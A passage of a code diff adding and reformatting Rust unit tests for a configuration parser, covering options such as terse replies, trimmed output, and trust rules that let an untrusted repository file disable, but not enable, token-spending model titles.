+            .expect("a boolean is a valid decisions switch");
+        assert!(parsed("decisions = false\n").overlay(repo).decisions());
+        let off = Config::parse("decisions = false\n", &path("repo"))
+            .expect("a boolean is a valid decisions switch");
+        assert!(
+            !parsed("").overlay(off).decisions(),
+            "a repository's file may switch Niobe's own words off, trusted or not"
+        );
+        assert!(invalid("decisions = \"yes\"\n").contains("decisions"));
+    }
+
+    #[test]
+    fn terse_replies_are_off_until_a_file_turns_them_on_and_the_later_file_wins() {
+        assert!(!parsed("").terse());
+        assert!(parsed("terse = true\n").terse());
+        let repo = Config::parse("terse = false\n", &path("repo"))
+            .expect("a valid file")
+            .untrusted();
+        assert!(!parsed("terse = true\n").overlay(repo).terse());
+        let on = Config::parse("terse = true\n", &path("repo"))
+            .expect("a valid file")
+            .untrusted();
+        assert!(
+            parsed("").overlay(on).terse(),
+            "an untrusted file may switch it"
+        );
+        assert!(invalid("terse = \"yes\"\n").contains("terse"));
+    }
+
+    #[test]
+    fn trimmed_output_is_off_until_a_file_turns_it_on_and_the_later_file_wins() {
+        assert!(!parsed("").trim());
+        assert!(parsed("trim = true\n").trim());
+        let repo = Config::parse("trim = false\n", &path("repo"))
+            .expect("a config that turns trimming off parses");
+        assert!(!parsed("trim = true\n").overlay(repo).trim());
+        assert!(invalid("trim = 1\n").contains("trim"));
+    }
+
+    #[test]
+    fn a_file_nobody_trusted_may_stop_titles_costing_tokens_and_may_not_start_them() {
+        let user = parsed("titles = \"first-prompt\"\n");
+        let spends = Config::parse("titles = \"model\"\n", &path("repo"))
+            .expect("the text in this test is valid")
+            .untrusted();
+        assert!(
+            spends.needs_trust(),
+            "withheld until it is trusted, and so asked about"
+        );
+        assert_eq!(
+            user.clone().overlay(spends).titles(),
+            Titles::FirstPrompt,
+            "the operator's own switch stays off"
+        );
+
+        let saves = Config::parse("titles = \"first-prompt\"\n", &path("repo"))
+            .expect("the text in this test is valid")
+            .untrusted();
+        assert_eq!(parsed("").overlay(saves).titles(), Titles::FirstPrompt);
+
+        let trusted = Config::parse("titles = \"model\"\n", &path("repo"))
+            .expect("the text in this test is valid");
+        assert_eq!(user.overlay(trusted).titles(), Titles::Model);
+    }
+
+    #[test]
+    fn a_file_that_turns_the_models_titles_on_is_one_to_trust_and_says_so() {
+        let spends = Config::parse("titles = \"model\"\n", &path("repo"))
+            .expect("the text in this test is valid");
+        assert!(spends.needs_trust(), "read whole, it would spend tokens");
+        assert!(!spends.withholds_model_titles());
+
+        let withheld = spends.untrusted();
+        assert!(withheld.needs_trust(), "still asked about once withheld");
+        assert!(withheld.withholds_model_titles());
+
+        let saves = Config::parse("titles = \"first-prompt\"\n", &path("repo"))
+            .expect("the text in this test is valid")
+            .untrusted();
+        assert!(!saves.needs_trust(), "turning titles off is not gated");
+        assert!(!saves.withholds_model_titles());
     }
 
     #[test]
@@ -1133,10 +1757,14 @@ backend = "codex"
     #[test]
     fn a_default_set_by_one_file_may_name_a_profile_another_defines() {
         let user = parsed("[profiles.work]\nbackend = \"claude\"\n");
-        let repo = Config::parse("default_profile = \"work\"\n", &path("repo")).expect("valid");
+        let repo = Config::parse("default_profile = \"work\"\n", &path("repo"))
+            .expect("the text in this test is valid");
         let config = user.overlay(repo);
         assert_eq!(
-            config.select(None).expect("valid").map(|s| s.name),
+            config
+                .select(None)
+                .expect("the text in this test is valid")
+                .map(|s| s.name),
             Some("work")
         );
     }
@@ -1197,7 +1825,8 @@ backend = "codex"
         assert_eq!(
             invalid("\ndefault = \"work\"\n"),
             "/configs/user/config.toml:2: default: unknown key; \
-             expected `default_profile`, `theme`, `effects`, `profiles` or `permissions`"
+             expected `default_profile`, `theme`, `titles`, `terse`, `decisions`, `trim`, \
+             `profiles`, `permissions`, `keys`, `notify` or `catch_up`"
         );
     }
 
@@ -1331,7 +1960,9 @@ backend = "codex"
         std::fs::write(&user, "[profiles.work]\nbackend = \"clade\"\n")
             .expect("the config is written");
 
-        let error = Config::load(&[&user]).expect_err("invalid").to_string();
+        let error = Config::load(&[&user])
+            .expect_err("an invalid config is an error")
+            .to_string();
         assert!(
             error.starts_with(&format!("{}:2: profiles.work.backend:", user.display())),
             "{error}"
